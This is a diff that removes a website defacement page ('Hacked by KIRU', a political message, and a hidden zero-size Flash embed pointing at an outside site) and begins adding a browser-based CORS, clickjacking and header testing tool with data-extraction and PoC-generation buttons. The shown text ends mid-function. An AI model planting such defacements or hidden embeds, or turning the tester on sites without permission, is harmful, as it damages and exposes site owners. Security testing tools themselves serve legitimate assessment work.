@@ -1,79 +1,2827 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>Hacked by KIRU !</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ultimate Security Testing Tool: CORS & Clickjacking</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
 
-<link href='http://fonts.googleapis.com/css?family=Candal' rel='stylesheet' type='text/css'>
-<script type="text/javascript" src="http://smilenet4u.googlecode.com/files/TipingText.js"></script>
-</head>
-<style type="text/css">
-/* Coded by MR.ZERO */
-@import url(http://fonts.googleapis.com/css?family=Share+Tech);
 body {
-	background:black url('http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg') center right no-repeat; 
-	color:#FFFFFF; 
-	text-decoration:none; 
-	font-family:"Share Tech", Courier, monospace; 
-	padding-left:200px; 
-	padding-top:200px; 
-	padding-right:300px; 
-	font-size:16px;
+    background: #000;
+    color: #00ff9c;
+    font-family: 'Share Tech Mono', monospace;
+    overflow-x: hidden;
+    min-height: 100vh;
+    padding: 20px;
 }
-a {
-	color: #FF0000;
-	text-decoration: none;
-}
-a:hover {
-	color: #fff;
-}
-#example1 {
-	font-size: 42px;
-	font-family: "Share Tech";
 
+/* Matrix background */
+body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: 
+        linear-gradient(rgba(0, 255, 156, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 156, 0.03) 1px, transparent 1px);
+    background-size: 50px 50px;
+    pointer-events: none;
+    z-index: -1;
 }
-#example2 {
-	font-size: 31px;
-	font-family: "Share Tech";
 
+/* Scan line animation */
+.scan-line {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 2px;
+    background: linear-gradient(to right, 
+        transparent, 
+        #00ff9c, 
+        transparent);
+    z-index: 999;
+    animation: scan 3s linear infinite;
+    pointer-events: none;
+    box-shadow: 0 0 10px #00ff9c;
 }
-#example3 {
-	font-size: 26px;
-	font-family: "Share Tech";
 
+@keyframes scan {
+    0% { top: 0%; }
+    100% { top: 100%; }
+}
+
+/* Header */
+.header {
+    background: linear-gradient(90deg, #001100, #003300);
+    border: 2px solid #00ff9c;
+    padding: 20px;
+    margin-bottom: 20px;
+    text-align: center;
+    box-shadow: 0 0 20px rgba(0, 255, 156, 0.2);
+}
+
+.title {
+    font-size: 24px;
+    color: #ff0044;
+    text-shadow: 0 0 10px #ff0044;
+    margin-bottom: 5px;
+    letter-spacing: 1px;
+}
+
+.subtitle {
+    font-size: 12px;
+    color: rgba(0, 255, 156, 0.7);
+}
+
+/* Main Container */
+.container {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    max-width: 1600px;
+    margin: 0 auto;
+}
+
+/* Panels */
+.panel {
+    background: rgba(7, 16, 12, 0.8);
+    border: 1px solid #003b2f;
+    padding: 20px;
+    box-shadow: inset 0 0 30px rgba(0, 255, 156, 0.1);
+}
+
+.section-title {
+    color: #ffcc00;
+    font-size: 18px;
+    margin-bottom: 15px;
+    border-bottom: 1px solid #003b2f;
+    padding-bottom: 5px;
+}
+
+/* URL Input */
+.url-input {
+    width: 100%;
+    padding: 12px;
+    background: rgba(0, 0, 0, 0.7);
+    border: 1px solid #003b2f;
+    color: #00ff9c;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    margin-bottom: 20px;
+    transition: all 0.3s;
+}
+
+.url-input:focus {
+    outline: none;
+    border-color: #00ff9c;
+    box-shadow: 0 0 20px rgba(0, 255, 156, 0.3);
+}
+
+.url-input::placeholder {
+    color: rgba(0, 255, 156, 0.5);
+}
+
+/* Tabs */
+.tabs {
+    display: flex;
+    border-bottom: 1px solid #003b2f;
+    margin-bottom: 20px;
+}
+
+.tab {
+    padding: 10px 20px;
+    background: transparent;
+    border: none;
+    color: rgba(0, 255, 156, 0.7);
+    font-family: 'Share Tech Mono', monospace;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.3s;
+}
+
+.tab.active {
+    color: #00ff9c;
+    border-bottom-color: #00ff9c;
+    background: rgba(0, 255, 156, 0.1);
+}
+
+.tab:hover {
+    color: #00ff9c;
+    background: rgba(0, 255, 156, 0.05);
+}
+
+/* Test Buttons */
+.test-buttons {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 10px;
+    margin-bottom: 20px;
+}
+
+.test-btn {
+    padding: 12px;
+    background: rgba(0, 0, 0, 0.6);
+    border: 1px solid;
+    color: #00ff9c;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    cursor: pointer;
+    transition: all 0.3s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.test-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 20px rgba(0, 255, 156, 0.3);
+}
+
+.test-btn.cors { border-color: #0099ff; }
+.test-btn.clickjack { border-color: #ffcc00; }
+.test-btn.headers { border-color: #00ff9c; }
+.test-btn.https { border-color: #b967ff; }
+.test-btn.full { border-color: #ff0044; }
+.test-btn.clear { border-color: #ff0044; }
+
+/* Status Indicators */
+.status-indicators {
+    display: flex;
+    gap: 20px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+}
+
+.status-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.status-dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    box-shadow: 0 0 10px currentColor;
+}
+
+.status-dot.vulnerable { color: #ff004c; }
+.status-dot.protected { color: #00ff9c; }
+.status-dot.unknown { color: #ffcc00; }
+.status-dot.testing { color: #0099ff; animation: pulse 1s infinite; }
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+/* Console */
+.console {
+    background: rgba(0, 0, 0, 0.8);
+    border: 1px solid #003b2f;
+    padding: 15px;
+    height: 200px;
+    overflow-y: auto;
+    font-size: 13px;
+    line-height: 1.4;
+    margin-bottom: 20px;
+    box-shadow: inset 0 0 30px rgba(0, 20, 0, 0.3);
+}
+
+.console-line {
+    margin-bottom: 8px;
+    padding: 5px 0;
+    border-bottom: 1px solid rgba(0, 255, 156, 0.1);
+}
+
+.console-line.ok { color: #00ff9c; }
+.console-line.bad { color: #ff004c; }
+.console-line.warn { color: #ffcc00; }
+.console-line.info { color: #0099ff; }
+.console-line.data { color: #b967ff; }
+.console-line.critical { color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
+
+.timestamp {
+    color: #ffcc00;
+    opacity: 0.7;
+    margin-right: 10px;
+}
+
+/* POC Panel */
+.poc-panel {
+    background: rgba(20, 0, 40, 0.8);
+    border: 1px solid #b967ff;
+    padding: 15px;
+    margin-top: 20px;
+    display: none;
+    box-shadow: inset 0 0 30px rgba(185, 103, 255, 0.1);
+}
+
+.poc-header {
+    color: #b967ff;
+    font-size: 16px;
+    margin-bottom: 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #b967ff;
+    padding-bottom: 8px;
+}
+
+.poc-content {
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    white-space: pre-wrap;
+    word-break: break-word;
+    background: rgba(0, 0, 0, 0.3);
+    padding: 10px;
+    border: 1px solid #003b2f;
+    max-height: 200px;
+    overflow-y: auto;
+    color: #ffcc00;
+}
+
+.poc-tabs {
+    display: flex;
+    border-bottom: 1px solid #003b2f;
+    margin-bottom: 10px;
+}
+
+.poc-tab {
+    padding: 8px 15px;
+    background: transparent;
+    border: none;
+    color: rgba(185, 103, 255, 0.7);
+    font-family: 'Share Tech Mono', monospace;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.3s;
+    font-size: 11px;
+}
+
+.poc-tab.active {
+    color: #b967ff;
+    border-bottom-color: #b967ff;
+    background: rgba(185, 103, 255, 0.1);
+}
+
+.poc-tab:hover {
+    color: #b967ff;
+    background: rgba(185, 103, 255, 0.05);
+}
+
+.poc-section {
+    display: none;
+}
+
+.poc-section.active {
+    display: block;
+}
+
+/* Tables */
+.data-table {
+    background: rgba(0, 0, 0, 0.6);
+    border: 1px solid #003b2f;
+    overflow: hidden;
+    margin-bottom: 20px;
+}
+
+.table-header {
+    display: grid;
+    grid-template-columns: 1fr 1fr 2fr;
+    padding: 12px 15px;
+    background: rgba(0, 255, 156, 0.1);
+    border-bottom: 1px solid #003b2f;
+    font-weight: bold;
+    text-transform: uppercase;
+    font-size: 12px;
+}
+
+.table-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 2fr;
+    padding: 10px 15px;
+    border-bottom: 1px solid rgba(0, 255, 156, 0.1);
+    transition: all 0.3s;
+}
+
+.table-row:hover {
+    background: rgba(0, 255, 156, 0.05);
+}
+
+.cell-header {
+    color: #00ff9c;
+}
+
+.cell-status.present { color: #00ff9c; }
+.cell-status.missing { color: #ff004c; }
+.cell-status.vulnerable { color: #ff004c; font-weight: bold; }
+.cell-status.secure { color: #00ff9c; font-weight: bold; }
+
+.cell-value {
+    color: rgba(0, 255, 156, 0.8);
+    font-family: monospace;
+    font-size: 11px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+/* Preview containers */
+.preview-container {
+    display: none;
+    background: rgba(7, 16, 12, 0.8);
+    border: 1px solid #003b2f;
+    margin-top: 20px;
+    overflow: hidden;
+    box-shadow: 0 0 30px rgba(0, 255, 156, 0.1);
+}
+
+.preview-header {
+    background: linear-gradient(90deg, rgba(255, 0, 68, 0.2), rgba(255, 0, 68, 0.1));
+    padding: 12px 20px;
+    border-bottom: 1px solid #ff0044;
+    color: #ff0044;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.preview-frame {
+    width: 100%;
+    height: 60vh;
+    background: #fff;
+    border: none;
+}
+
+/* Extracted Data Panel */
+.extracted-data {
+    background: rgba(0, 0, 0, 0.6);
+    border: 1px solid #b967ff;
+    padding: 15px;
+    margin-top: 20px;
+    max-height: 300px;
+    overflow-y: auto;
+    display: none;
+}
+
+.extracted-header {
+    color: #b967ff;
+    font-size: 16px;
+    margin-bottom: 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.extracted-content {
+    font-family: monospace;
+    font-size: 12px;
+    white-space: pre-wrap;
+    word-break: break-word;
+    background: rgba(0, 0, 0, 0.3);
+    padding: 10px;
+    border: 1px solid #003b2f;
+    max-height: 200px;
+    overflow-y: auto;
+}
+
+.extracted-stats {
+    color: #ffcc00;
+    font-size: 12px;
+    margin-top: 10px;
+    display: flex;
+    gap: 20px;
+}
+
+.close-btn {
+    background: transparent;
+    border: 1px solid #b967ff;
+    color: #b967ff;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.close-btn:hover {
+    background: #b967ff;
+    color: #000;
+}
+
+/* CORS Test Panel */
+.cors-test-panel {
+    background: rgba(0, 20, 40, 0.6);
+    border: 1px solid #0099ff;
+    padding: 15px;
+    margin-top: 20px;
+}
+
+.cors-test-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 15px;
+}
+
+.cors-test-btn {
+    padding: 8px;
+    background: rgba(0, 0, 0, 0.5);
+    border: 1px solid #0099ff;
+    color: #0099ff;
+    font-family: 'Share Tech Mono', monospace;
+    cursor: pointer;
+    font-size: 11px;
+    text-align: center;
+}
+
+.cors-test-btn:hover {
+    background: rgba(0, 153, 255, 0.1);
+}
+
+/* Hidden HTTPS iframe */
+.https-frame {
+    display: none;
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    top: -1000px;
+    left: -1000px;
+}
+
+/* Status colors */
+.ok { 
+    color: #00ff9c;
+    text-shadow: 0 0 5px #00ff9c;
+}
+.bad { 
+    color: #ff0044;
+    text-shadow: 0 0 5px #ff0044;
+}
+.warn { 
+    color: #ffcc00;
+    text-shadow: 0 0 5px #ffcc00;
+}
+
+/* Custom scrollbar */
+::-webkit-scrollbar {
+    width: 8px;
+}
+
+::-webkit-scrollbar-track {
+    background: rgba(0, 0, 0, 0.3);
+}
+
+::-webkit-scrollbar-thumb {
+    background: #003b2f;
+}
+
+::-webkit-scrollbar-thumb:hover {
+    background: #00ff9c;
+}
+
+/* Responsive */
+@media (max-width: 1200px) {
+    .container {
+        grid-template-columns: 1fr;
+    }
+    
+    .cors-test-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+}
+
+@media (max-width: 768px) {
+    .test-buttons {
+        grid-template-columns: 1fr;
+    }
+    
+    .table-header,
+    .table-row {
+        grid-template-columns: 1fr;
+        gap: 5px;
+    }
+    
+    .cors-test-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .preview-frame {
+        height: 40vh;
+    }
+    
+    .poc-tabs {
+        flex-wrap: wrap;
+    }
+    
+    .poc-tab {
+        padding: 5px 10px;
+        font-size: 10px;
+    }
 }
 </style>
+</head>
 <body>
-<object type="application/x-shockwave-flash" width="0"
-height="0"data="=true">
-<param  name="movie"value="https://paglasongs.com/ashley-look-at-me-mp3-songs.html">
-</object>
+<div class="scan-line"></div>
 
-
-<div id="example1">OWN3D BY <br>
-<font color="red">丂尸讠ᗪ 🝗尺</font>
-</div>
-<br>
-<div id="example2">
-<font color="#FFFFFF">
-Message for pakistan :<br> (jai hind jai bharat) <br> 
-<br>
-
-
-<br><br></div>
-Name :<br>
-<div id="example3">
-<font color="red">
- <br> sp!d3r <br>
-    INDIAN Hacker 
-</font>
+<div class="header">
+    <div class="title">🛡️ ULTIMATE SECURITY TESTING TOOL</div>
+    <div class="subtitle">CORS, Clickjacking & Security Headers Tester v2.0</div>
 </div>
 
-<script type="text/javascript">
-new TypingText(document.getElementById("example1"));
-new TypingText(document.getElementById("example3"));
+<div class="container">
+    <!-- Control Panel -->
+    <div class="panel">
+        <div class="section-title">TARGET CONFIGURATION</div>
+        
+        <input type="text" id="targetUrl" class="url-input" 
+               placeholder="https://target.com" 
+               value="https://example.com">
+        
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('quick')">Quick Tests</button>
+            <button class="tab" onclick="switchTab('cors')">CORS Testing</button>
+            <button class="tab" onclick="switchTab('clickjack')">Clickjacking</button>
+            <button class="tab" onclick="switchTab('headers')">Headers</button>
+            <button class="tab" onclick="switchTab('advanced')">Advanced</button>
+        </div>
+        
+        <div class="status-indicators">
+            <div class="status-item">
+                <div class="status-dot unknown" id="clickjackStatus"></div>
+                <span id="clickjackStatusText">Clickjacking: Not tested</span>
+            </div>
+            <div class="status-item">
+                <div class="status-dot unknown" id="corsStatus"></div>
+                <span id="corsStatusText">CORS: Not tested</span>
+            </div>
+            <div class="status-item">
+                <div class="status-dot unknown" id="httpsStatus"></div>
+                <span id="httpsStatusText">HTTPS: Not tested</span>
+            </div>
+            <div class="status-item">
+                <div class="status-dot unknown" id="headersStatus"></div>
+                <span id="headersStatusText">Headers: Not tested</span>
+            </div>
+        </div>
+        
+        <!-- Quick Tests -->
+        <div id="quickButtons" class="test-buttons">
+            <button class="test-btn cors" onclick="testCORS()">Test CORS</button>
+            <button class="test-btn clickjack" onclick="testClickjacking()">Test Clickjacking</button>
+            <button class="test-btn headers" onclick="testHeaders()">Test Security Headers</button>
+            <button class="test-btn https" onclick="testHTTPS()">Test HTTPS‑Only</button>
+        </div>
+        
+        <!-- CORS Tests -->
+        <div id="corsButtons" class="test-buttons" style="display: none;">
+            <button class="test-btn cors" onclick="testCorsWildcard()">Test Wildcard</button>
+            <button class="test-btn cors" onclick="testCorsCredentials()">Test Credentials</button>
+            <button class="test-btn cors" onclick="extractHTML()">Extract HTML</button>
+            <button class="test-btn cors" onclick="extractJSON()">Extract JSON</button>
+            <button class="test-btn cors" onclick="testNullOrigin()">Test NULL Origin</button>
+            <button class="test-btn cors" onclick="testMultipleOrigins()">Test Methods</button>
+            <button class="test-btn cors" onclick="generatePoC()">Generate PoC</button>
+        </div>
+        
+        <!-- Clickjacking Tests -->
+        <div id="clickjackButtons" class="test-buttons" style="display: none;">
+            <button class="test-btn clickjack" onclick="quickClickjackTest()">Quick Test</button>
+            <button class="test-btn clickjack" onclick="checkClickjackHeaders()">Check Headers</button>
+            <button class="test-btn clickjack" onclick="testIframe()">Test Iframe Types</button>
+            <button class="test-btn clickjack" onclick="explainClickjacking()">Explain Attack</button>
+        </div>
+        
+        <!-- Headers Tests -->
+        <div id="headersButtons" class="test-buttons" style="display: none;">
+            <button class="test-btn headers" onclick="testAllHeaders()">Test All Headers</button>
+            <button class="test-btn headers" onclick="testSecurityHeaders()">Test Security Headers</button>
+            <button class="test-btn headers" onclick="testCookieHeaders()">Test Cookie Headers</button>
+            <button class="test-btn headers" onclick="testCachingHeaders()">Test Caching Headers</button>
+            <button class="test-btn headers" onclick="testServerHeaders()">Test Server Headers</button>
+            <button class="test-btn headers" onclick="generateHeadersReport()">Generate Report</button>
+        </div>
+        
+        <!-- Advanced Tests -->
+        <div id="advancedButtons" class="test-buttons" style="display: none;">
+            <button class="test-btn full" onclick="runFullTest()">Run Full Test</button>
+            <button class="test-btn headers" onclick="testAllHeaders()">Test All Headers</button>
+            <button class="test-btn https" onclick="testHTTPSEnforcement()">Test HTTPS Enforcement</button>
+            <button class="test-btn clear" onclick="clearAll()">Clear All</button>
+        </div>
+        
+        <!-- CORS Test Panel -->
+        <div class="cors-test-panel" id="corsTestPanel" style="display: none;">
+            <div class="section-title">CORS TEST OPTIONS</div>
+            <div class="cors-test-grid">
+                <button class="cors-test-btn" onclick="extractHTML()">Extract HTML</button>
+                <button class="cors-test-btn" onclick="extractJSON()">Extract JSON</button>
+                <button class="cors-test-btn" onclick="extractText()">Extract Text</button>
+                <button class="cors-test-btn" onclick="testNullOrigin()">NULL Origin</button>
+                <button class="cors-test-btn" onclick="testMultipleOrigins()">Multiple Methods</button>
+                <button class="cors-test-btn" onclick="generatePoC()">Generate PoC</button>
+            </div>
+        </div>
+        
+        <div class="section-title">CONSOLE OUTPUT</div>
+        <div class="console" id="console">
+            <div class="console-line ok">>> SYSTEM INITIALIZED</div>
+            <div class="console-line warn">>> ENTER TARGET URL TO BEGIN</div>
+            <div class="console-line ok">>> TERMINAL READY</div>
+        </div>
+        
+        <!-- POC Panel -->
+        <div class="poc-panel" id="pocPanel">
+            <div class="poc-header">
+                <span>PROOF OF CONCEPT</span>
+                <button class="close-btn" onclick="closePocPanel()">×</button>
+            </div>
+            <div class="poc-tabs">
+                <button class="poc-tab active" onclick="switchPocTab('clickjack')">Clickjacking</button>
+                <button class="poc-tab" onclick="switchPocTab('cors')">CORS</button>
+                <button class="poc-tab" onclick="switchPocTab('headers')">Headers</button>
+                <button class="poc-tab" onclick="switchPocTab('https')">HTTPS</button>
+            </div>
+            <div id="clickjackPoc" class="poc-section active">
+                <div class="poc-content" id="clickjackPocContent">
+                    <!-- Clickjacking POC code will be displayed here -->
+                </div>
+            </div>
+            <div id="corsPoc" class="poc-section">
+                <div class="poc-content" id="corsPocContent">
+                    <!-- CORS request/response details will be displayed here -->
+                </div>
+            </div>
+            <div id="headersPoc" class="poc-section">
+                <div class="poc-content" id="headersPocContent">
+                    <!-- Headers POC code will be displayed here -->
+                </div>
+            </div>
+            <div id="httpsPoc" class="poc-section">
+                <div class="poc-content" id="httpsPocContent">
+                    <!-- HTTPS POC code will be displayed here -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Results Panel -->
+    <div class="panel">
+        <div class="section-title" id="resultsTitle">SECURITY HEADERS</div>
+        
+        <!-- Category Tabs for Headers -->
+        <div class="tabs" id="headerCategoryTabs" style="display: none;">
+            <button class="tab active" onclick="switchHeaderCategory('all')">All Headers</button>
+            <button class="tab" onclick="switchHeaderCategory('security')">Security</button>
+            <button class="tab" onclick="switchHeaderCategory('cors')">CORS</button>
+            <button class="tab" onclick="switchHeaderCategory('cache')">Cache</button>
+            <button class="tab" onclick="switchHeaderCategory('server')">Server</button>
+        </div>
+        
+        <div class="data-table" id="headersTable">
+            <div class="table-header">
+                <div>HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        </div>
+        
+        <!-- CORS Results -->
+        <div class="data-table" id="corsResults" style="display: none;">
+            <div class="table-header">
+                <div>TEST</div>
+                <div>RESULT</div>
+                <div>DETAILS</div>
+            </div>
+        </div>
+        
+        <!-- Extracted Data -->
+        <div class="extracted-data" id="extractedData">
+            <div class="extracted-header">
+                <span>EXTRACTED DATA</span>
+                <button class="close-btn" onclick="closeExtractedData()">×</button>
+            </div>
+            <div class="extracted-content" id="extractedContent"></div>
+            <div class="extracted-stats" id="extractedStats"></div>
+        </div>
+        
+        <!-- Preview containers -->
+        <div id="corsBox" class="preview-container">
+            <div class="preview-header">Site Is Vulnerable to CORS</div>
+            <iframe id="corsFrame" class="preview-frame"></iframe>
+        </div>
+        
+        <div id="clickBox" class="preview-container">
+            <div class="preview-header">Site Is Vulnerable to Clickjacking</div>
+            <iframe id="clickFrame" class="preview-frame"></iframe>
+        </div>
+    </div>
+</div>
 
+<!-- Hidden HTTPS iframe -->
+<iframe id="httpsFrame" class="https-frame"></iframe>
 
-new TypingText(document.getElementById("example2"), 150, function(i){ var ar = new Array("_"); return " " + ar[i.length % ar.length]; });
+<script>
+// ==================== GLOBAL STATE ====================
+let testResults = [];
+let currentTarget = null;
+let corsVulnerable = false;
+let lastCorsRequest = null;
+let lastCorsResponse = null;
+let allHeaders = [];
+let currentHeaderCategory = 'all';
 
+// ==================== DOM ELEMENTS ====================
+const consoleEl = document.getElementById('console');
+const headersTable = document.getElementById('headersTable');
+const extractedData = document.getElementById('extractedData');
+const extractedContent = document.getElementById('extractedContent');
+const extractedStats = document.getElementById('extractedStats');
+const corsTestPanel = document.getElementById('corsTestPanel');
+const corsResults = document.getElementById('corsResults');
+const corsBox = document.getElementById('corsBox');
+const clickBox = document.getElementById('clickBox');
+const corsFrame = document.getElementById('corsFrame');
+const clickFrame = document.getElementById('clickFrame');
+const pocPanel = document.getElementById('pocPanel');
+const headerCategoryTabs = document.getElementById('headerCategoryTabs');
+const resultsTitle = document.getElementById('resultsTitle');
 
+// POC content elements
+const clickjackPocContent = document.getElementById('clickjackPocContent');
+const corsPocContent = document.getElementById('corsPocContent');
+const headersPocContent = document.getElementById('headersPocContent');
+const httpsPocContent = document.getElementById('httpsPocContent');
+
+// Status elements
+const clickjackStatus = document.getElementById('clickjackStatus');
+const clickjackStatusText = document.getElementById('clickjackStatusText');
+const corsStatus = document.getElementById('corsStatus');
+const corsStatusText = document.getElementById('corsStatusText');
+const httpsStatus = document.getElementById('httpsStatus');
+const httpsStatusText = document.getElementById('httpsStatusText');
+const headersStatus = document.getElementById('headersStatus');
+const headersStatusText = document.getElementById('headersStatusText');
+
+// Tab elements
+const quickButtons = document.getElementById('quickButtons');
+const corsButtons = document.getElementById('corsButtons');
+const clickjackButtons = document.getElementById('clickjackButtons');
+const headersButtons = document.getElementById('headersButtons');
+const advancedButtons = document.getElementById('advancedButtons');
+
+// ==================== UTILITY FUNCTIONS ====================
+function normalizeURL(url) {
+    return url.startsWith("http") ? url : "https://" + url;
+}
+
+function getTargetURL() {
+    const url = document.getElementById('targetUrl').value.trim();
+    if (!url) {
+        logToConsole("ERROR: No target URL specified", "bad");
+        return null;
+    }
+    return normalizeURL(url);
+}
+
+function hideAllPreviews() {
+    corsBox.style.display = 'none';
+    clickBox.style.display = 'none';
+    corsFrame.srcdoc = '';
+    clickFrame.src = '';
+}
+
+function logToConsole(message, type = "info") {
+    const timestamp = new Date().toLocaleTimeString();
+    const line = document.createElement('div');
+    line.className = `console-line ${type}`;
+    line.innerHTML = `
+        <span class="timestamp">[${timestamp}]</span>
+        <span>${message}</span>
+    `;
+    consoleEl.appendChild(line);
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+}
+
+function updateStatus(element, dot, text) {
+    element.className = 'status-dot ' + dot;
+    element.nextElementSibling.textContent = text;
+}
+
+function switchTab(tab) {
+    // Update tabs
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    
+    // Show/hide buttons
+    quickButtons.style.display = tab === 'quick' ? 'grid' : 'none';
+    corsButtons.style.display = tab === 'cors' ? 'grid' : 'none';
+    clickjackButtons.style.display = tab === 'clickjack' ? 'grid' : 'none';
+    headersButtons.style.display = tab === 'headers' ? 'grid' : 'none';
+    advancedButtons.style.display = tab === 'advanced' ? 'grid' : 'none';
+    
+    // Show/hide panels
+    corsTestPanel.style.display = tab === 'cors' ? 'block' : 'none';
+    corsResults.style.display = tab === 'cors' ? 'block' : 'none';
+    
+    // Show/hide header category tabs
+    headerCategoryTabs.style.display = tab === 'headers' ? 'flex' : 'none';
+    resultsTitle.textContent = tab === 'cors' ? 'CORS TEST RESULTS' : 'SECURITY HEADERS';
+    
+    hideAllPreviews();
+    logToConsole(`Switched to ${tab.toUpperCase()} testing mode`, "info");
+}
+
+function switchHeaderCategory(category) {
+    currentHeaderCategory = category;
+    document.querySelectorAll('#headerCategoryTabs .tab').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    displayFilteredHeaders();
+}
+
+function displayFilteredHeaders() {
+    if (allHeaders.length === 0) return;
+    
+    const headerCategories = {
+        'security': [
+            'x-frame-options', 'content-security-policy', 'strict-transport-security',
+            'x-content-type-options', 'referrer-policy', 'permissions-policy',
+            'x-xss-protection', 'x-permitted-cross-domain-policies', 'expect-ct',
+            'public-key-pins', 'cross-origin-embedder-policy', 'cross-origin-opener-policy',
+            'cross-origin-resource-policy', 'clear-site-data'
+        ],
+        'cors': [
+            'access-control-allow-origin', 'access-control-allow-credentials',
+            'access-control-allow-methods', 'access-control-allow-headers',
+            'access-control-expose-headers', 'access-control-max-age',
+            'access-control-allow-private-network', 'timing-allow-origin'
+        ],
+        'cache': [
+            'cache-control', 'pragma', 'expires', 'etag', 'last-modified',
+            'if-modified-since', 'if-none-match', 'age', 'vary'
+        ],
+        'server': [
+            'server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version',
+            'x-runtime', 'x-version', 'via', 'x-backend-server'
+        ]
+    };
+    
+    let filteredHeaders = allHeaders;
+    
+    if (currentHeaderCategory !== 'all') {
+        const categoryList = headerCategories[currentHeaderCategory] || [];
+        filteredHeaders = allHeaders.filter(header => 
+            categoryList.some(catHeader => 
+                header.name.toLowerCase().includes(catHeader.toLowerCase())
+            )
+        );
+    }
+    
+    headersTable.innerHTML = `
+        <div class="table-header">
+            <div>HEADER</div>
+            <div>STATUS</div>
+            <div>VALUE</div>
+        </div>
+    `;
+    
+    filteredHeaders.forEach(({ name, value }) => {
+        const isPresent = !!value;
+        const row = document.createElement('div');
+        row.className = 'table-row';
+        row.innerHTML = `
+            <div class="cell-header">${name}</div>
+            <div class="cell-status ${isPresent ? 'present' : 'missing'}">
+                ${isPresent ? 'PRESENT' : 'MISSING'}
+            </div>
+            <div class="cell-value" title="${value || 'Not set'}">
+                ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+            </div>
+        `;
+        headersTable.appendChild(row);
+    });
+}
+
+function clearAll() {
+    consoleEl.innerHTML = `
+        <div class="console-line ok">>> SYSTEM RESET</div>
+        <div class="console-line warn">>> ENTER TARGET URL TO BEGIN</div>
+        <div class="console-line ok">>> TERMINAL READY</div>
+    `;
+    
+    headersTable.innerHTML = `
+        <div class="table-header">
+            <div>HEADER</div>
+            <div>STATUS</div>
+            <div>VALUE</div>
+        </div>
+    `;
+    
+    corsResults.innerHTML = `
+        <div class="table-header">
+            <div>TEST</div>
+            <div>RESULT</div>
+            <div>DETAILS</div>
+        </div>
+    `;
+    
+    extractedData.style.display = 'none';
+    pocPanel.style.display = 'none';
+    hideAllPreviews();
+    testResults = [];
+    corsVulnerable = false;
+    lastCorsRequest = null;
+    lastCorsResponse = null;
+    allHeaders = [];
+    
+    updateStatus(clickjackStatus, 'unknown', 'Clickjacking: Not tested');
+    updateStatus(corsStatus, 'unknown', 'CORS: Not tested');
+    updateStatus(httpsStatus, 'unknown', 'HTTPS: Not tested');
+    updateStatus(headersStatus, 'unknown', 'Headers: Not tested');
+    
+    logToConsole("All results cleared", "info");
+}
+
+function showExtractedData(content, title = "Extracted Data") {
+    extractedContent.textContent = content;
+    extractedStats.innerHTML = `
+        <div>Size: ${content.length} characters</div>
+        <div>Lines: ${content.split('\n').length}</div>
+        <div>Extracted: ${new Date().toLocaleTimeString()}</div>
+    `;
+    extractedData.style.display = 'block';
+    extractedData.scrollIntoView({ behavior: 'smooth' });
+    
+    // Highlight JSON if it looks like JSON
+    if (content.trim().startsWith('{') || content.trim().startsWith('[')) {
+        try {
+            const parsed = JSON.parse(content);
+            extractedContent.textContent = JSON.stringify(parsed, null, 2);
+            logToConsole("Data formatted as JSON", "data");
+        } catch (e) {
+            // Not valid JSON
+        }
+    }
+}
+
+function closeExtractedData() {
+    extractedData.style.display = 'none';
+}
+
+function addCorsResult(test, result, details) {
+    const row = document.createElement('div');
+    row.className = 'table-row';
+    
+    let statusClass = 'secure';
+    let statusText = 'SECURE';
+    
+    if (result.includes('VULNERABLE') || result.includes('ALLOWED')) {
+        statusClass = 'vulnerable';
+        statusText = 'VULNERABLE';
+    } else if (result.includes('BLOCKED') || result.includes('SECURE')) {
+        statusClass = 'secure';
+        statusText = 'SECURE';
+    } else {
+        statusClass = 'missing';
